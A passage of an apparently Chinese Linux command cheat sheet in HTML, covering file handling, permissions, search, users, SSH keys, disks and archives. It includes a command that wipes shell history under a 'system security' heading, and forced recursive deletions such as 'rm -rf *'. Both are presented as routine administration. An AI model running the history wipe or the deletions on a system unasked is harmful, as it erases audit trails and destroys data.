src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211170542267.png" alt="image-20241211170541827"><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211170545969.png" alt="image-20241211170545481"></li></ul><h2 id="系统安全"><a href="#系统安全" class="headerlink" title="系统安全"></a><font style="color:rgb(51, 51, 51);">系统安全</font></h2><ul><li><strong><font style="color:rgb(51, 51, 51);">echo &gt; ~&#x2F;.bash_history&amp;history -c</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：linux彻底清除history历史命令（原理：history命令是被保存在内存中的，当退出或者登录shell时，会自动保存到~&#x2F;.bash_history文件中；echo &gt; ~&#x2F;.bash_history会清除文件内容，history -c会清除内存中历史命令，两个命令一起执行才能彻底清除history历史命令）</font></li></ul><h2 id="文件和目录"><a href="#文件和目录" class="headerlink" title="文件和目录"></a><font style="color:rgb(51, 51, 51);">文件和目录</font></h2><p><font style="color:rgb(119, 119, 119);">cd:是Change Directory的缩写，用来切换工作目录，语法：cd [相对或绝对路径或特殊符号]</font></p><ul><li><strong><font style="color:rgb(51, 51, 51);">cd</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：进入该用户的主目录 ~（root用户为&#x2F;root,其他用户为&#x2F;home&#x2F;用户名）</font></li><li><strong><font style="color:rgb(51, 51, 51);">cd ..</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：返回上一级目录（注意要空格）</font></li><li><strong><font style="color:rgb(51, 51, 51);">cd -</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：返回上次所在目录</font></li><li><strong><font style="color:rgb(51, 51, 51);">cd &#x2F;</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：返回根目录 （绝对路径）</font></li><li><strong><font style="color:rgb(51, 51, 51);">cd .&#x2F;目录1&#x2F;目录2</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：进入当前目录下的子目录（相对路径）</font></li><li><strong><font style="color:rgb(51, 51, 51);">pwd</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：显示工作路径（Print Working Directory 的缩写）</font></li></ul><p><font style="color:rgb(119, 119, 119);">ls:是List的缩写，用于列出目录下的文件，语法：</font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(251, 229, 225);&quot;&gt;ls [选项][目录或文件名]&lt;/font&gt;</code></p><ul><li><strong><font style="color:rgb(51, 51, 51);">ls -a</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:列出文件下所有的文件，包括以“.“开头的隐藏文件</font></li><li>**<font style="color:rgb(51, 51, 51);">ls -lh <em>.log</font>**<font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:列出文件的详细信息（.log结尾，</em>为通配符代表任意多个字符）</font></li><li><strong><font style="color:rgb(51, 51, 51);">file 文件或目录</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：显示文件的类型（目录、text、zip、shell脚本等）</font></li><li><strong><font style="color:rgb(51, 51, 51);">mkdir dir1</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:创建目录(dir1)（mkdir为make directory的缩写）</font></li><li><strong><font style="color:rgb(51, 51, 51);">mkdir -p .&#x2F;dir1&#x2F;dir2</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:递归创建目录（-p：父目录不存在时，同时建立）</font></li><li><strong><font style="color:rgb(51, 51, 51);">touch a.txt</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:创建文件a.txt</font></li></ul><p><font style="color:rgb(119, 119, 119);">rm:可以删除一个目录中的一个或多个文件或目录，也可以将某个目录及其下属的所有文件及其子目录均删除掉; 语法：rm (选项)(参数)（注：如果参数中含有目录，则必须加上-r选项）；</font></p><ul><li><strong><font style="color:rgb(51, 51, 51);">rm 文件</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：删除文件</font></li><li><strong><font style="color:rgb(51, 51, 51);">rm -r 目录或文件</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：删除目录（及目录下所有文件）（非空也可以）</font></li><li><strong><font style="color:rgb(51, 51, 51);">rm -rf 目录或文件</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：强制删除，如：rm -rf * 为删除当前目录下所有文件</font></li><li><strong><font style="color:rgb(51, 51, 51);">find -inum 1842601 -exec rm -rf {} ;</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：删除乱码文件或目录(会提示找不到此文件或文件夹但其实已经删除了)（上传中文文件会乱码，rm命令删除不了）（先使用ls -i命令找到inode，即文件或目录前面的数字字符串,如1842601;）</font></li></ul><p><font style="color:rgb(119, 119, 119);">mv：是move的缩写，可以用来剪切移动文件、目录或者将文件改名；</font></p><p><font style="color:rgb(119, 119, 119);">语法：mv 源文件 目标文件（改名）或目录（移动）；</font></p><ul><li><strong><font style="color:rgb(51, 51, 51);">mv a b</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:移动或者重命名一个文件或者目录（存在即移动目录或覆盖文件，不存在即改名）</font></li><li><strong><font style="color:rgb(51, 51, 51);">mv &#x2F;opt&#x2F;git&#x2F;g &#x2F;opt&#x2F;a</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：移动g到opt目录下并改名为a（a目录不存在，若存在则为移动g到a目录下）</font></li><li><strong><font style="color:rgb(51, 51, 51);">mv -t .&#x2F;test a.txt b.txt</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：移动多个文件到某目录下</font></li></ul><p><font style="color:rgb(119, 119, 119);">cp:复制文件或目录；cp命令可以将单个或多个文件复制到一个已经</font><strong><font style="color:rgb(119, 119, 119);">存在</font></strong><font style="color:rgb(119, 119, 119);">的目录下；</font></p><p><font style="color:rgb(119, 119, 119);">常用：cp -ai 文件或目录 目标目录;</font></p><ul><li><strong><font style="color:rgb(51, 51, 51);">cp -ai &#x2F;opt&#x2F;abc &#x2F;opt&#x2F;git&#x2F;</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：复制abc目录（或文件）到git目录下（选项a表示文件的属性也复制、目录下所有文件都复制；i表示覆盖前询问）</font></li></ul><p><font style="color:rgb(119, 119, 119);">ln：link的缩写，用于建立硬（软）链接，常用于软件安装时建软链接(类似快捷方式)到PATH;</font></p><p><font style="color:rgb(119, 119, 119);">语法：ln [-s] 源文件 目标文件</font></p><ul><li><strong><font style="color:rgb(51, 51, 51);">ln -s &#x2F;opt&#x2F;a.txt &#x2F;opt&#x2F;git&#x2F;</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:对文件创建软链接（快捷方式不改名还是a.txt）</font></li><li><strong><font style="color:rgb(51, 51, 51);">ln -s &#x2F;opt&#x2F;a.txt &#x2F;opt&#x2F;git&#x2F;b</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:（快捷方式改名为b）（下面的一样可以改名）</font></li><li><strong><font style="color:rgb(51, 51, 51);">ln -s &#x2F;opt&#x2F;mulu &#x2F;opt&#x2F;git&#x2F;</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:对目录创建软链接</font></li><li><strong><font style="color:rgb(51, 51, 51);">ln &#x2F;opt&#x2F;a.txt &#x2F;opt&#x2F;git&#x2F;</font></strong><font style="color:rgb(51, 51, 51);"> :对文件创建硬链接</font><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211170551497.png" alt="image-20241211170551032"></li></ul><h2 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a><font style="color:rgb(51, 51, 51);">文件权限</font></h2><ul><li><strong><font style="color:rgb(51, 51, 51);">chmod [-R] 777文件或目录</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：设置权限（chmod a+rwx a&#x3D;chmod ugo +rwx a&#x3D;chmod 777 a）</font></li></ul><p><font style="color:rgb(119, 119, 119);">注： r（read）对应4，w（write）对应2，x（execute）执行对应1；<br></font><font style="color:rgb(119, 119, 119);">-R：递归更改文件属组，就是在更改某个目录文件的属组时，如果加上-R的参数，那么该目录下的所有文件的属组都会更改）</font></p><ul><li><code>**&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(251, 229, 225);&quot;&gt;chmod [&#123;ugoa&#125;&#123;+-=&#125;&#123;rwx&#125;][文件或目录]&lt;/font&gt;**</code><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：如chmod u-w,g+x,o&#x3D;r test.txt为user（拥有者）去掉写权限，group(所属组)加上执行权限，other(其他人)权限等于只读；</font></li><li><strong><font style="color:rgb(51, 51, 51);">chown [-R] admin:root &#x2F;opt&#x2F;</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：变更文件及目录的拥有者和所属组（-R递归处理所有文件和文件夹，admin为拥有者，root为所属者）</font></li></ul><h2 id="文件查找"><a href="#文件查找" class="headerlink" title="文件查找"></a><font style="color:rgb(51, 51, 51);">文件查找</font></h2><ul><li><strong><font style="color:rgb(51, 51, 51);">locate a.txt</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：在系统全局范围内查找文件名包含a.txt字样的文件（比find快）;</font></li></ul><p><font style="color:rgb(119, 119, 119);">locate:原理是updatedb会把文件系统中的信息存放到数据库databases中（但一般一天才执行一次，所以locate找不到新创建的文件，需要先手动执行updatedb，再执行locate）,locate从数据库中读数据;</font></p><p><font style="color:rgb(119, 119, 119);">find：在目录结构中搜索文件，并执行指定的操作<br></font><font style="color:rgb(119, 119, 119);">语法：find pathname -options [-print -exec …]<br></font><font style="color:rgb(119, 119, 119);">pathname ：为 find命令所查找的目录路径。例如用.来表示当前目录，用&#x2F;来表示系统根目录（find查找范围为目标目录及其子目录所有文件及目录）；<br></font><font style="color:rgb(119, 119, 119);">-exec： find命令对匹配的文件执行该参数所给出的shell命令。相应命令的形式为’command’ { } ;，注意{ }和\；之间的空格；<br></font><font style="color:rgb(119, 119, 119);">-print： find命令将匹配的文件输出到标准输出；</font></p><ul><li><strong><font style="color:rgb(51, 51, 51);">find &#x2F;home -mtime -2</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：在&#x2F;home下查最近2*24小时内改动过的文件</font></li><li><strong><font style="color:rgb(51, 51, 51);">find . -size +100M</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：在当前目录及子目录下查找大于100M的文件</font></li><li><strong><font style="color:rgb(51, 51, 51);">find . -type f</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：f表示文件类型为普通文件（b&#x2F;d&#x2F;c&#x2F;p&#x2F;l&#x2F;f 分别为块设备、目录、字符设备、管道、符号链接、普通文件）</font></li><li><strong><font style="color:rgb(51, 51, 51);">find . -mtime +2 -exec rm {} ;</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:查出更改时间在2<em>24小时以前的文件并删除它</em>*</font></li><li><code>**&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(251, 229, 225);&quot;&gt;find . -name &#39;*.log&#39; -exec grep -i hello &#123;&#125; \; -print&lt;/font&gt;**</code><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:在当前目录及子目录下查出文件名后缀为.log的文件并且该文件内容包含了hello字样并打印，-exec 命令 {} \表示对查出文件操作，-i表示不区分大小写；</font></li><li><code>**&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(251, 229, 225);&quot;&gt;find . -name &#39;*.log&#39;|grep hello&lt;/font&gt;**</code><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:在当前目录及子目录下查出文件名后缀为.log的文件并且文件名包含了hello字样（grep用来处理字符串）；</font></li><li><strong><font style="color:rgb(51, 51, 51);">grep -i ‘HELLO’ . -r -n</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：在当前目录及子目录下查找文件内容中包含hello的文件并显示文件路径（-i表示忽略大小写）</font></li><li><strong><font style="color:rgb(51, 51, 51);">which java</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：在环境变量$PATH设置的目录里查找符合条件的文件，并显示路径（查询运行文件所在路径）</font></li><li><strong><font style="color:rgb(51, 51, 51);">whereis java</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:查看安装的软件的所有的文件路径（whereis 只能用于查找二进制文件、源代码文件和man手册页，一般文件的定位需使用locate命令）</font></li></ul><h2 id="查看文件的内容"><a href="#查看文件的内容" class="headerlink" title="查看文件的内容"></a><font style="color:rgb(51, 51, 51);">查看文件的内容</font></h2><h3 id="查看日志常用"><a href="#查看日志常用" class="headerlink" title="查看日志常用"></a><font style="color:rgb(51, 51, 51);">查看日志常用</font></h3><ul><li><strong><font style="color:rgb(51, 51, 51);">tail [-nf] 文件名</font></strong><font style="color:rgb(51, 51, 51);">:显示文件尾几行内容,n指定显示多少行,f用于实时追踪文件的所有更新，常用于查阅正在改变的日志文件（如tail -f -n 3 a.log 表示开始显示最后3行，并在文件更新时实时追加显示，没有-n默认10行）</font></li><li><strong><font style="color:rgb(51, 51, 51);">head [-n] 文件名</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：显示文件头n行内容，n指定显示多少行</font></li><li><strong><font style="color:rgb(51, 51, 51);">cat filename |grep “关键词” -A10</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：查询文件中某个关键字前后多少行内容（含关键词所在行）：后10行（-A10）、前10行（-B10）、前后10行(-C10)</font></li><li><strong><font style="color:rgb(51, 51, 51);">cat [-n] filename |grep “关键词”</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：显示包括关键词所在行内容（-n表示连行号一起显示）</font></li><li><strong><font style="color:rgb(51, 51, 51);">sed -n ‘2,$p’ filename</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：显示第二行到最后一行（$也可改成具体行号）；</font></li></ul><h3 id="其他查看文件的内容"><a href="#其他查看文件的内容" class="headerlink" title="其他查看文件的内容"></a><font style="color:rgb(51, 51, 51);">其他查看文件的内容</font></h3><ul><li><strong><font style="color:rgb(51, 51, 51);">less 文件名</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：一页一页的显示文件内容（搜索翻页同man命令）</font></li><li><strong><font style="color:rgb(51, 51, 51);">sed -n ‘&#x2F;搜索的关键词&#x2F;p’ a.txt</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：显示包括关键词所在行</font></li><li><strong><font style="color:rgb(51, 51, 51);">less a.txt |grep 关键词</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：显示包括关键词所在行（管道符”|”它只能处理由前面一个指令传出的正确输出信息，对错误信息信息没有直接处理能力。然后传递给下一个命令，作为标准的输入；）</font></li><li><strong><font style="color:rgb(51, 51, 51);">cat &#x2F;etc&#x2F;passwd |awk -F ‘:’ ‘{print $1}’</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：显示第一列</font></li></ul><h2 id="文本处理"><a href="#文本处理" class="headerlink" title="文本处理"></a><font style="color:rgb(51, 51, 51);">文本处理</font></h2><ul><li><strong><font style="color:rgb(51, 51, 51);">ls -l&gt;file</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：输出重定向&gt;（改变原来系统命令的默认执行方式）：ls -l命令结果输出到file文件中，若存在，则覆盖</font></li><li><strong><font style="color:rgb(51, 51, 51);">cat file1 &gt;&gt;file</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：输出重定向之cat命令结果输出追加到file文件(&gt;表示覆盖原文件内容，&gt;&gt;表示追加内容)</font></li><li><strong><font style="color:rgb(51, 51, 51);">ls fileno 2&gt;file</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">： 2&gt;表示重定向标准错误输出（文件不存在，报错信息保存至file文件）；</font></li><li><strong><font style="color:rgb(51, 51, 51);">cowsay &lt;a.txt</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:重定向标准输入’命令&lt;文件’表示将文件做为命令的输入（为从文件读数据作为输入）</font></li><li><strong><font style="color:rgb(51, 51, 51);">sed -i ‘4,$d’ a.txt</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：删除第四行到最后一行（$表示最后一行）（sed可以增删改查文件内容）</font></li><li><strong><font style="color:rgb(51, 51, 51);">sed -i ‘$a 增加的字符串’ a.txt</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：在最后一行的下一行增加字符串</font></li><li><strong><font style="color:rgb(51, 51, 51);">sed -i ‘s&#x2F;old&#x2F;new&#x2F;g’ a.txt</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:替换字符串；格式为sed ‘s&#x2F;要替换的字符串&#x2F;新的字符串&#x2F;g’ 修改的文件</font></li><li><strong><font style="color:rgb(51, 51, 51);">grep -o ‘关键词’ test.log|wc -l</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:统计某个关键词在某个文件中出现的次数（如出现3次输出3）</font></li><li><strong><font style="color:rgb(51, 51, 51);">vim 文件</font></strong><font style="color:rgb(51, 51, 51);">：编辑查看文件（同vi）</font></li></ul><h2 id="用户与权限"><a href="#用户与权限" class="headerlink" title="用户与权限"></a><font style="color:rgb(51, 51, 51);">用户与权限</font></h2><ul><li><strong><font style="color:rgb(51, 51, 51);">useradd 用户名</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：创建用户</font></li><li><strong><font style="color:rgb(51, 51, 51);">userdel -r 用户名</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:删除用户：（-r表示把用户的主目录一起删除）</font></li><li><strong><font style="color:rgb(51, 51, 51);">usermod -g 组名 用户名</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：修改用户的组</font></li><li><strong><font style="color:rgb(51, 51, 51);">usermod -aG 组名 用户名</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：将用户添加到组</font></li><li><strong><font style="color:rgb(51, 51, 51);">groups test</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：查看test用户所在的组</font></li><li><strong><font style="color:rgb(51, 51, 51);">cat &#x2F;etc&#x2F;group |grep test</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：查看test用户详情：用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell</font></li><li><strong><font style="color:rgb(51, 51, 51);">passwd [ludf] 用户名</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：用户改自己密码，不需要输入用户名，选项-d:指定空口令,-l:禁用某用户，-u解禁某用户，-f：强迫用户下次登录时修改口令</font></li><li><strong><font style="color:rgb(51, 51, 51);">groupadd 组名</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：创建用户组</font></li><li><strong><font style="color:rgb(51, 51, 51);">groupdel 用户组</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：删除组</font></li><li><strong><font style="color:rgb(51, 51, 51);">groupmod -n 新组名 旧组名</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：修改用户组名字</font></li><li><strong><font style="color:rgb(51, 51, 51);">su - 用户名</font></strong><font style="color:rgb(51, 51, 51);">：完整的切换到一个用户环境（相当于登录）（建议用这个）（退出用户：exit）</font></li><li><strong><font style="color:rgb(51, 51, 51);">su 用户名</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:切换到用户的身份（环境变量等没变，导致很多命令要加上绝对路径才能执行）</font></li><li><strong><font style="color:rgb(51, 51, 51);">sudo 命令</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：以root的身份执行命令（输入用户自己的密码，而su为输入要切换用户的密码，普通用户需设置&#x2F;etc&#x2F;sudoers才可用sudo）</font></li><li><strong><font style="color:rgb(51, 51, 51);">SSH 免密登录</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：</font></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用OpenSSH生成密钥</span></span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line"><span class="comment">#公钥信息写入authorized_keys文件中并设置权限</span></span><br><span class="line"><span class="built_in">cd</span> ~/.ssh</span><br><span class="line"><span class="built_in">cat</span> id_rsa.pub &gt;&gt; authorized_keys</span><br><span class="line"><span class="built_in">chmod</span> 700 ~/.ssh</span><br><span class="line"><span class="built_in">chmod</span> 600 ~/.ssh/authorized_keys</span><br><span class="line"><span class="comment">#生成putty的私钥（Putty使用的私钥格式和OpenSSH生成的有点不同，需要转换一下putty才能使用）</span></span><br><span class="line">把私钥id_rsa下载到本地后后缀改成.ppk，如id_rsa_ip_commonuser.ppk</span><br><span class="line">使用puttygen工具的“Load”读取id_rsa文件，点击“Save private key”保留私钥；</span><br><span class="line">putty关联私钥文件即可登陆服务器</span><br></pre></td></tr></table></figure><h2 id="磁盘管理"><a href="#磁盘管理" class="headerlink" title="磁盘管理"></a><font style="color:rgb(51, 51, 51);">磁盘管理</font></h2><ul><li><strong><font style="color:rgb(51, 51, 51);">fdisk -l</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:查看磁盘信息(可查各个硬盘容量大小、可查各硬盘分区情况)（各硬盘或硬盘下分区必须挂载到某个目录才能被使用）</font></li><li><strong><font style="color:rgb(51, 51, 51);">fdisk &#x2F;dev&#x2F;sdb</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:对硬盘sdb创建分区</font></li><li><strong><font style="color:rgb(51, 51, 51);">mkfs.ext4 &#x2F;dev&#x2F;vdb1</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:修改格式化硬盘分区vdb1的文件系统类型为ext4</font></li><li><strong><font style="color:rgb(51, 51, 51);">df -TH</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:显示磁盘的空间使用情况、文件系统类型、挂载点（硬盘挂载了才会显示）</font></li><li><strong><font style="color:rgb(51, 51, 51);">df -h &#x2F;var&#x2F;log</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:（显示log所在分区（挂载点）、目录所在磁盘及可用的磁盘容量）</font></li><li><em><font style="color:rgb(51, 51, 51);">du -sm &#x2F;var&#x2F;log&#x2F;</font><strong><font style="color:rgb(51, 51, 51);"> </font></strong><font style="color:rgb(51, 51, 51);">| sort -rn</font></em><font style="color:rgb(51, 51, 51);">* : 根据占用磁盘空间大小排序（MB）某目录下文件和目录大小</font></li><li><strong><font style="color:rgb(51, 51, 51);">mount &#x2F;dev&#x2F;sda1 &#x2F;mnt</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：硬盘sda1挂载到&#x2F;mnt目录（mount 装置文件名 挂载点）</font></li><li><strong><font style="color:rgb(51, 51, 51);">mount -t cifs -o username&#x3D;luolanguo,password&#x3D;win用户账号密码,vers&#x3D;3.0</font>****<font style="color:rgb(51, 51, 51);"> </font></strong><a href="https://10.2.1.178/G"><strong><font style="color:rgb(51, 51, 51);">&#x2F;&#x2F;10.2.1.178&#x2F;G</font></strong></a><strong><font style="color:rgb(51, 51, 51);"> </font>****<font style="color:rgb(51, 51, 51);">&#x2F;mnt&#x2F;usb</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:远程linux 共享挂载windows的U盘,G为U盘共享名，需设置U盘共享</font></li><li><strong><font style="color:rgb(51, 51, 51);">mount -o loop &#x2F;opt&#x2F;soft&#x2F;CentOS-7-x86_64-DVD-1708.iso &#x2F;media&#x2F;CentOS</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：挂载iso文件</font></li><li><strong><font style="color:rgb(51, 51, 51);">umount &#x2F;dev&#x2F;sda1</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：取消挂载（umount 装置文件名或挂载点）</font></li></ul><h2 id="压缩、解压和打包备份"><a href="#压缩、解压和打包备份" class="headerlink" title="压缩、解压和打包备份"></a><font style="color:rgb(51, 51, 51);">压缩、解压和打包备份</font></h2><p><font style="color:rgb(119, 119, 119);">单纯tar仅为打包（多个文件包成一个大文件），加上参数-j(bzip2格式.bz2)、-z（gzip格式.gz）可以备份、压缩(-c)、解压（-x），备份一般比压缩多加参数-p（保留原本文件的权限与属性），-C可以指定解压到特定目录；bzip2、gzip只能对单一文件压缩；</font></p><ul><li><strong><font style="color:rgb(51, 51, 51);">file 文件名</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：查文件类型（可看是用哪一种方式压缩的）</font></li><li><strong><font style="color:rgb(51, 51, 51);">tar -zxvf a.tar.gz -C .&#x2F;test</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：解压tar.gz到当前目录下的test目录</font></li><li><strong><font style="color:rgb(51, 51, 51);">tar -zcvf &#x2F;opt&#x2F;c.tar.gz .&#x2F;a&#x2F;</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：压缩tar.gz（把当前目录下的a目录及目录下所有文件压缩为 &#x2F;opt&#x2F;目录下的c.tar.gz，这样tar -zxvf c.tar.gz解压出来带有目录a）</font></li><li><strong><font style="color:rgb(51, 51, 51);">tar -jxvf a.tar.bz2</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：解压tar.bz2（到当前目录）</font></li><li><strong><font style="color:rgb(51, 51, 51);">tar -jcvf c.tar.bz2 .&#x2F;a&#x2F;</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：压缩tar.bz2（把当前目录下的a目录及目录下所有文件压缩到当前目录下为c.tar.gz2）</font></li><li><strong><font style="color:rgb(51, 51, 51);">unzip a.zip</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：解压zip（到当前目录）</font></li><li><strong><font style="color:rgb(51, 51, 51);">unzip -o mdmtest.war -d &#x2F;opt&#x2F;mdm</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">：推荐使用unzip解压war包（-o覆盖原有文件，-d指定文件解压后存储的目录）</font></li><li><strong><font style="color:rgb(51, 51, 51);">zip -r c.zip .&#x2F;a&#x2F;</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">:压缩zip(把当前目录下的a目录及目录下所有文件压缩到当前目录下为c.zip</font></li><li><strong><font style="color:rgb(51, 51, 51);">bzip2 -k file1</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">： 压缩一个 ‘file1’ 的文件（-k表示保留源文件）（bzip2格式，比gzip好）</font></li><li><strong><font style="color:rgb(51, 51, 51);">bzip2 -d -k file1.bz2</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">： 解压一个叫做 ‘file1.bz2’的文件</font></li><li><strong><font style="color:rgb(51, 51, 51);">gzip file1</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">： 压缩一个叫做 ‘file1’的文件（gzip格式）（不能保留源文件）</font></li><li><strong><font style="color:rgb(51, 51, 51);">gzip -9 file1</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">： 最大程度压缩</font></li><li><strong><font style="color:rgb(51, 51, 51);">gzip -d file1.gz</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">： 解压缩一个叫做 ‘file1’的文件</font></li></ul><h2 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a><font style="color:rgb(51, 51, 51);">软件安装</font></h2><ul><li><font style="color:rgb(85, 85, 85);">尽量用yum源（apt-get）安装，不行就rpm、deb包安装，能不手动编译的就不要手动编译；</font></li><li><font style="color:rgb(85, 85, 